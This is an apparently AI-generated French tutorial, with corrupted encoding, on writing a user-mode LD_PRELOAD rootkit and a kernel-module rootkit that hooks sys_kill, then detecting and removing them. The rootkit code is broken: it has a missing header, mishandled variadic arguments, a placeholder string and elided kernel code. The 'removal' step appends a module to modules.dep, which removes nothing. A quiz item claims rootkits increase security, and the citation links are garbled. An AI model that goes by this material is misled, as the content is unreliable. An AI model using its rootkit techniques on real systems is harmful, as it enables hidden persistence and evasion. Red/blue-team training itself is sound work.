# Tutoriel : Concevoir et supprimer un rootkit (kernel & userâ€‘mode)

## ğŸ¯ Objectif  
ExpÃ©rimenter la crÃ©ation dâ€™un rootkit simple (userâ€‘mode et LKM) pour comprendre les techniques dâ€™injection et de dissimulation, puis apprendre Ã  les dÃ©tecter et Ã  nettoyer un systÃ¨me compromis.

## ğŸ§  ScÃ©nario dâ€™ancrage Ã©motionnel  
Vous Ãªtes red team et implantez un rootkit stealth pour maintenir un accÃ¨s root. Votre blue team, ensuite, doit le dÃ©tecter et le supprimer en full forensic.

---

## ğŸ› ï¸ PrÃ©requis  
- Linux (Ubuntu/Debian), accÃ¨s root  
- Installez :
  ```bash
  sudo apt install build-essential python3 net-tools chkrootkit rkhunter bpftool bpftrace falco

	â€¢	Connaissances de base en C, Python

â¸»

ğŸ§© Ã‰tapeâ€¯1 â€“ Userâ€‘mode rootkit via LD_PRELOAD

CrÃ©ez hook.c :

#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
typedef int (*orig_printf_t)(const char*,...);
int printf(const char *fmt,...) {
    orig_printf_t orig = (orig_printf_t)dlsym(RTLD_NEXT, "printf");
    if (strstr(fmt, "flag")==NULL)
        return orig(fmt);
    return orig("{{hidder}}");
}

Compilez :

gcc -shared -fPIC -o hook.so hook.c -ldl
LD_PRELOAD=./hook.so bash -c 'echo flag=secret'

â†’ le flux flag= est masquÃ©  ï¿¼ ï¿¼ ï¿¼

â¸»

ğŸ§© Ã‰tapeâ€¯2 â€“ Kernel rootkit minimal (LKM)

Surveillez sys_kill :

// rootkit.c
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
...
SYSCALL_DEFINE1(kill, pid_t, pid) {
    if (pid == 99999) return 0;
    return old_kill(pid);
}

Compilez, installez insmod rootkit.ko, testez kill -9 99999 devient silencieux ()

â¸»

ğŸ§  Ã‰tapeâ€¯3 â€“ Technique de camouflage
	â€¢	LKM rootkits enlÃ¨vent leur module de listes /proc/modules, lsmod ;
	â€¢	Certains, comme Reptile, cachent le contenu de fichiers via balisesâ€¯;
	â€¢	Utilisez bpftool, bpftrace, falco pour inspecter hooks ou structures noyau  ï¿¼ ï¿¼

â¸»

ğŸ” Ã‰tapeâ€¯4 â€“ DÃ©tection & forensic
	1.	chkrootkit / rkhunter :

sudo chkrootkit
sudo rkhunter -c

â€“ dÃ©tecte anomalies LKM  ï¿¼

	2.	Triage de sizes vs lecture :

ls -l /etc/modules
cat /etc/modules | wc -c

â†’ diffÃ¨re si un rootkit masque contenu  ï¿¼

	3.	Introspection eBPF :

tracee --trace bpf
bpftrace -e 'kprobe: kallsyms_lookup_name { printf("%s\n", comm); }'

â†’ dÃ©tecte modules LKM suspects qui appellent kallsyms_lookup_name (Reptile/KoviD)  ï¿¼

â¸»

ğŸ› ï¸ Ã‰tapeâ€¯5 â€“ Suppression

Une fois lâ€™inspection ou le module identifiÃ© :

bpftool prog detach id <id>
rmmod rootkit
# ou
echo "/path/to/module.ko" >> /usr/lib/modules/$(uname -r)/modules.dep
sudo depmod -a

Puis revalidez via chkrootkit, logs et mÃ©moire.

â¸»

ğŸ§  Ã‰tapeâ€¯6 â€“ Automatisation & monitoring
	â€¢	CrÃ©ez un cron quotidien : chkrootkit, rkhunter, introspection eBPF â†’ alertes syslog/Slack
	â€¢	CorrÃ©lez anomalies via SIEM
	â€¢	DÃ©veloppez un mini outil en Rust ou C pour scanner mÃ©moire LKM (struct module consistency)  ï¿¼ ï¿¼ ï¿¼ ï¿¼

â¸»

ğŸ§ª Quiz de consolidation
	1.	Comment LD_PRELOAD masque-t-il un outputâ€¯?
	2.	Pourquoi un rootkit LKM accroÃ®tâ€‘il la sÃ©curitÃ©â€¯?
	3.	Quel outil compare ls -l et cat | wc -câ€¯?
	4.	Pourquoi un module appelle-t-il kallsyms_lookup_nameâ€¯?
	5.	Quelle diffÃ©rence entre nettoyage full wipe et suppression LKMâ€¯?

â¸»

âœ… Cas dâ€™usage
	â€¢	Simulations red/blue team
	â€¢	Formation SOC, detection eBPF rootkits
	â€¢	Ã‰ducation forensic Linux sur kernel modules

â¸»

ğŸ”§ Extensions possibles
	â€¢	Concevoir rootkit polymorphe (rename addresses, syscall hooks)
	â€¢	ImplÃ©menter outil de scan LKM automatisÃ©
	â€¢	IntÃ©grer introspection KVM/VM trace pour rootkit hypervisor-level

â¸»

ğŸ“ RÃ©sultat attendu
	â€¢	Vous serez capable de crÃ©er et dÃ©tecter un rootkit logique ou kernel
	â€¢	Savoir automatiser la dÃ©tection et la suppression
	â€¢	Comprendre la limite de signature contre les menaces persistantes

---

### ğŸ“š Sources & rÃ©fÃ©rences  
- LD_PRELOAD userâ€‘mode hooking  [oai_citation:12â€¡sandflysecurity.com](https://sandflysecurity.com/blog/how-to-detect-and-decloak-linux-stealth-rootkit-data/?utm_source=chatgpt.com) [oai_citation:13â€¡Geekflare](https://geekflare.com/protection/rootkits-detection-and-removal-tools/?utm_source=chatgpt.com) [oai_citation:14â€¡Wikipedia](https://en.wikipedia.org/wiki/Rkhunter?utm_source=chatgpt.com) [oai_citation:15â€¡IT trip](https://en.ittrip.xyz/linux/linux-rootkit-detection?utm_source=chatgpt.com) [oai_citation:16â€¡CodePal](https://codepal.ai/code-generator/query/SnjR7xND/python-code-generate-rootkit?utm_source=chatgpt.com)  
- CrÃ©ation LKM rootkit & sys_kill hook  [oai_citation:17â€¡gotoco.github.io](https://gotoco.github.io/blog/kernel/rootkit/2015/10/16/simple-rootkit.html?utm_source=chatgpt.com)  
- Reptile/KoviD detection via struct module scan & kallsyms usage  [oai_citation:18â€¡THALIUM](https://blog.thalium.re/posts/linux-kernel-rust-module-for-rootkit-detection/?utm_source=chatgpt.com)  
- Techniques de dÃ©tection rootkit (ls/vs cat bytes)  [oai_citation:19â€¡Udemy](https://www.udemy.com/course/rootkit-and-stealth-software-development/?utm_source=chatgpt.com)  
- Outilsâ€¯: chkrootkit, rkhunter, tracee, falco, bpftool  [oai_citation:20â€¡baobegou.com](https://www.baobegou.com/3624.html?utm_source=chatgpt.com)